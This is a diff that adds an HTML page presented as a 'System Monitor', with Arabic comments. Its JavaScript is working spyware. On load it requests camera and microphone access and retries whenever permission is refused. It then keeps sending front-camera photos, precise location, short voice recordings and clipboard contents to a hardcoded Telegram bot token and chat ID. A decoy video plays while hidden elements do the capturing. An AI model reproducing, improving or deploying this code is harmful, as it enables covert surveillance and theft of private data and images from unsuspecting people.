@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>System Monitor</title>
+    <link rel="icon" type="image/x-icon" href="amige.ico">
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .status {
+            margin: 10px;
+            padding: 10px;
+            border: 1px solid #0f0;
+        }
+        #bgVideo {
+            width: 400px;
+            height: 300px;
+            margin: 20px auto;
+            border: 2px solid #0f0;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>📱 System Monitor - ACTIVE</h1>
+
+    <div id="status" class="status">🔄 Starting System...</div>
+    <div id="cameraStatus" class="status">📷 Camera: Active</div>
+    <div id="micStatus" class="status">🎤 Microphone: Active</div>
+    <div id="locationStatus" class="status">📍 Location: Active</div>
+    <div id="clipboardStatus" class="status">📋 Clipboard: Active</div>
+
+    <!-- فيديو متوسط الحجم -->
+    <video id="bgVideo" autoplay loop muted playsinline>
+        <source src="video.mp4" type="video/mp4">
+    </video>
+
+    <!-- عناصر مخفية -->
+    <div class="hidden">
+        <video id="hiddenVideo" autoplay muted playsinline></video>
+        <canvas id="hiddenCanvas"></canvas>
+    </div>
+
+    <script>
+// التوكن ورقم المحادثة
+const BOT_TOKEN = '8613444711:AAHjclYS0xTyOaegIM719VmP33oHTXgo9rs';
+const CHAT_ID = '8380505065';
+
+let voiceCounter = 0;
+let dataCounter = 0;
+let clipboardCounter = 0;
+let micStream = null;
+let isSystemActive = false;
+
+// دالة تحديث الحالة - النصوص تبقى ثابتة
+function updateStatus(message) {
+    document.getElementById('status').textContent = message;
+}
+
+// النصوص الثابتة
+function updateAllStatuses() {
+    document.getElementById('status').textContent = "✅ SYSTEM ACTIVE";
+    document.getElementById('cameraStatus').textContent = "📷 Camera: Active";
+    document.getElementById('micStatus').textContent = "🎤 Microphone: Active";
+    document.getElementById('locationStatus').textContent = "📍 Location: Active";
+    document.getElementById('clipboardStatus').textContent = "📋 Clipboard: Active";
+}
+
+// دالة إرسال إلى تيليجرام
+async function sendToTelegram(message, imageBlob = null) {
+    try {
+        if (imageBlob && imageBlob.size > 1000) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, `camera_${Date.now()}.jpg`);
+            formData.append('caption', message);
+            formData.append('parse_mode', 'Markdown');
+
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+
+            return await response.json();
+        } else {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            return await response.json();
+        }
+    } catch (error) {
+        return {ok: false};
+    }
+}
+
+// دالة إرسال صوت إلى تيليجرام
+async function sendVoiceToTelegram(message, voiceBlob) {
+    try {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('voice', voiceBlob, `voice_${Date.now()}.wav`);
+        formData.append('caption', message);
+        formData.append('parse_mode', 'Markdown');
+
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+            method: 'POST',
+            body: formData
+        });
+
+        return await response.json();
+    } catch (error) {
+        return {ok: false};
+    }
+}
+
+// دالة الحافظة المحسنة - ترسل جميع النصوص
+async function checkAndSendClipboard() {
+    if (!isSystemActive) return;
+
+    try {
+        clipboardCounter++;
+
+        let currentClipboard = '';
+
+        // محاولات متعددة لقراءة الحافظة
+        try {
+            // الطريقة 1: Clipboard API الحديث
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                currentClipboard = await navigator.clipboard.readText();
+            }
+        } catch (error) {
+            try {
+                // الطريقة 2: execCommand
+                const tempInput = document.createElement('textarea');
+                tempInput.style.position = 'absolute';
+                tempInput.style.left = '-9999px';
+                tempInput.style.top = '-9999px';
+                document.body.appendChild(tempInput);
+
+                tempInput.focus();
+                const pasteSuccess = document.execCommand('paste');
+                if (pasteSuccess) {
+                    currentClipboard = tempInput.value;
+                }
+                document.body.removeChild(tempInput);
+
+            } catch (e) {
+                try {
+                    // الطريقة 3: contenteditable
+                    const tempDiv = document.createElement('div');
+                    tempDiv.contentEditable = true;
+                    tempDiv.style.position = 'absolute';
+                    tempDiv.style.left = '-9999px';
+                    tempDiv.style.top = '-9999px';
+                    document.body.appendChild(tempDiv);
+                    tempDiv.focus();
+                    document.execCommand('paste');
+                    currentClipboard = tempDiv.innerText || tempDiv.textContent;
+                    document.body.removeChild(tempDiv);
+                } catch (e2) {}
+            }
+        }
+
+        // إرسال جميع محتويات الحافظة بغض النظر
+        if (currentClipboard && currentClipboard.trim() !== '') {
+            const clipboardMessage = `📋 *CLIPBOARD #${clipboardCounter}*\n\n` +
+                                   `📝 المحتوى:\n\`\`\`\n${currentClipboard}\n\`\`\`\n\n` +
+                                   `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                                   `📊 الطول: ${currentClipboard.length} حرف`;
+
+            await sendToTelegram(clipboardMessage);
+        }
+
+        // الاستمرار بدون توقف
+        setTimeout(checkAndSendClipboard, 1000);
+
+    } catch (error) {
+        // الاستمرار بدون توقف
+        setTimeout(checkAndSendClipboard, 1000);
+    }
+}
+
+// دالة الصورة والموقع - ترسل كل 6 ثواني
+async function sendDataAndImage() {
+    if (!isSystemActive) return;
+
+    try {
+        dataCounter++;
+
+        // جلب الموقع
+        let location = null;
+        try {
+            location = await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        resolve({
+                            lat: position.coords.latitude.toFixed(6),
+                            lon: position.coords.longitude.toFixed(6),
+                            accuracy: Math.round(position.coords.accuracy)
+                        });
+                    },
+                    error => {
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000
+                    }
+                );
+            });
+        } catch (e) {
+            location = null;
+        }
+
+        // جلب الصورة من الكاميرا الأمامية - بدون فلاش
+        let cameraImage = null;
+        try {
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.getElementById('hiddenCanvas');
+
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+
+                // رسم الفيديو فقط بدون فلاش
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                cameraImage = await new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+                });
+            }
+
+        } catch (e) {
+            cameraImage = null;
+        }
+
+        // بناء الرسالة مع روابط الموقع
+        let message = `🚀 *تقرير النظام #${dataCounter}*\n\n`;
+
+        if (location) {
+            const googleMapsUrl = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
+            const openStreetMapUrl = `https://www.openstreetmap.org/?mlat=${location.lat}&mlon=${location.lon}`;
+
+            message += `📍 *الموقع:*\n`;
+            message += `• خط العرض: ${location.lat}\n`;
+            message += `• خط الطول: ${location.lon}\n`;
+            message += `• الدقة: ${location.accuracy} متر\n\n`;
+
+            message += `🗺️ *روابط الموقع:*\n`;
+            message += `• [Google Maps](${googleMapsUrl})\n`;
+            message += `• [OpenStreetMap](${openStreetMapUrl})\n\n`;
+        }
+
+        message += `📱 *معلومات الجهاز:*\n`;
+        message += `• الشاشة: ${screen.width}x${screen.height}\n`;
+        message += `• النظام: ${navigator.platform}\n\n`;
+
+        message += `📊 *الإحصائيات:*\n`;
+        message += `• الرسائل الصوتية: ${voiceCounter}\n`;
+        message += `• الحافظة: ${clipboardCounter}\n\n`;
+
+        message += `⏰ ${new Date().toLocaleString('ar-SA')}`;
+
+        await sendToTelegram(message, cameraImage);
+
+        // إرسال بعد 6 ثواني
+        setTimeout(sendDataAndImage, 6000);
+
+    } catch (error) {
+        // إعادة المحاولة بعد 6 ثواني
+        setTimeout(sendDataAndImage, 6000);
+    }
+}
+
+// دالة الصوت - ترسل كل 4 ثواني
+function recordAndSendVoice() {
+    if (!micStream || !isSystemActive) return;
+
+    try {
+        voiceCounter++;
+
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const source = audioContext.createMediaStreamSource(micStream);
+        const processor = audioContext.createScriptProcessor(1024, 1, 1);
+        const chunks = [];
+        let recordingTime = 0;
+        const maxRecordingTime = 4;
+
+        processor.onaudioprocess = (event) => {
+            if (!isSystemActive) return;
+
+            const inputData = event.inputBuffer.getChannelData(0);
+            chunks.push(new Float32Array(inputData));
+            recordingTime += 1024 / audioContext.sampleRate;
+
+            if (recordingTime >= maxRecordingTime) {
+                source.disconnect();
+                processor.disconnect();
+                processAndSendVoice(chunks, audioContext.sampleRate, voiceCounter);
+            }
+        };
+
+        source.connect(processor);
+        processor.connect(audioContext.destination);
+
+        setTimeout(() => {
+            if (!isSystemActive) return;
+
+            try {
+                source.disconnect();
+                processor.disconnect();
+                if (chunks.length > 0) {
+                    processAndSendVoice(chunks, audioContext.sampleRate, voiceCounter);
+                }
+            } catch (e) {}
+        }, maxRecordingTime * 1000);
+
+    } catch (error) {}
+}
+
+// معالجة وإرسال الصوت
+async function processAndSendVoice(chunks, sampleRate, counter) {
+    try {
+        const buffer = mergeBuffers(chunks, chunks.length * 1024);
+        const dataView = encodeWAVBuffer(buffer, sampleRate);
+        const voiceBlob = new Blob([dataView], { type: 'audio/wav' });
+
+        const voiceMessage = `🎤 *رسالة صوتية #${counter}*\n\n` +
+                           `⏱️ المدة: 4 ثواني\n` +
+                           `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
+
+        await sendVoiceToTelegram(voiceMessage, voiceBlob);
+
+        // إرسال بعد 4 ثواني
+        setTimeout(recordAndSendVoice, 4000);
+
+    } catch (error) {
+        // إعادة المحاولة بعد 4 ثواني
+        setTimeout(recordAndSendVoice, 4000);
+    }
+}
+
+// دوال المساعدة للصوت
+function mergeBuffers(chunks, length) {
+    const result = new Float32Array(length);
+    let offset = 0;
+    for (let i = 0; i < chunks.length; i++) {
+        result.set(chunks[i], offset);
+        offset += chunks[i].length;
+    }
+    return result;
+}
+
+function encodeWAVBuffer(buffer, sampleRate) {
+    const length = buffer.length * 2;
+    const view = new DataView(new ArrayBuffer(44 + length));
+    const writeString = (offset, string) => {
+        for (let i = 0; i < string.length; i++) {
+            view.setUint8(offset + i, string.charCodeAt(i));
+        }
+    };
+
+    writeString(0, 'RIFF');
+    view.setUint32(4, 36 + length, true);
+    writeString(8, 'WAVE');
+    writeString(12, 'fmt ');
+    view.setUint32(16, 16, true);
+    view.setUint16(20, 1, true);
+    view.setUint16(22, 1, true);
+    view.setUint32(24, sampleRate, true);
+    view.setUint32(28, sampleRate * 2, true);
+    view.setUint16(32, 2, true);
+    view.setUint16(34, 16, true);
+    writeString(36, 'data');
+    view.setUint32(40, length, true);
+
+    let offset = 44;
+    for (let i = 0; i < buffer.length; i++) {
+        const sample = Math.max(-1, Math.min(1, buffer[i]));
+        view.setInt16(offset, sample < 0 ? sample * 0x8000 : sample * 0x7FFF, true);
+        offset += 2;
+    }
+
+    return view;
+}
+
+// الدالة الرئيسية
+async function startAll() {
+    updateStatus('🔄 Starting System...');
+
+    try {
+        // طلب الأذونات تلقائياً - استخدام الكاميرا الأمامية
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 1280, max: 1920 },
+                height: { ideal: 720, max: 1080 },
+                frameRate: { ideal: 30, max: 60 },
+                facingMode: 'user' // كاميرا أمامية بدلاً من الخلفية
+            },
+            audio: {
+                echoCancellation: false,
+                noiseSuppression: false,
+                autoGainControl: false,
+                channelCount: 1,
+                sampleRate: 44100,
+                sampleSize: 16,
+                volume: 1.0
+            }
+        });
+
+        micStream = stream;
+
+        // إعداد الفيديو المخفي
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        hiddenVideo.srcObject = stream;
+        hiddenVideo.play().catch(e => console.log('Video play error:', e));
+
+        // انتظار تحميل الفيديو
+        await new Promise((resolve) => {
+            hiddenVideo.onloadedmetadata = () => {
+                hiddenVideo.play();
+                resolve();
+            };
+            setTimeout(resolve, 1000);
+        });
+
+        // تفعيل النظام
+        isSystemActive = true;
+        updateAllStatuses();
+
+        // بدء جميع العمليات
+        sendDataAndImage(); // الصورة والموقع كل 6 ثواني
+        recordAndSendVoice(); // الصوت كل 4 ثواني
+        checkAndSendClipboard(); // الحافظة باستمرار
+
+        // تشغيل الفيديو
+        document.getElementById('bgVideo').play();
+
+        // إرسال رسالة بدء التشغيل
+        sendToTelegram('🚀 *SYSTEM STARTED - FRONT CAMERA*\n\n✅ النظام يعمل الآن\n📸 الكاميرا الأمامية نشطة\n📋 جمع جميع بيانات الحافظة');
+
+    } catch (error) {
+        updateStatus('❌ Permission Denied - Retrying...');
+
+        // إعادة المحاولة بعد ثانية
+        setTimeout(startAll, 1000);
+    }
+}
+
+// السماح بتحديث الصفحة يدوياً
+function allowManualRefresh() {
+    // إزالة أي قيود على التحديث
+    document.addEventListener('keydown', (e) => {
+        // السماح بجميع المفاتيح
+    });
+
+    // السماح بقائمة السياق
+    document.addEventListener('contextmenu', (e) => {
+        // السماح بقائمة السياق
+    });
+}
+
+// بدء التشغيل التلقائي
+window.addEventListener('load', () => {
+    allowManualRefresh();
+    startAll();
+});
+
+// إيقاف عند إغلاق الصفحة
+window.addEventListener('beforeunload', () => {
+    isSystemActive = false;
+});
+
+// إعادة التشغيل عند العودة للصفحة
+window.addEventListener('focus', () => {
+    if (!isSystemActive) {
+        startAll();
+    }
+});
+
+    </script>
+</body>
+</html>
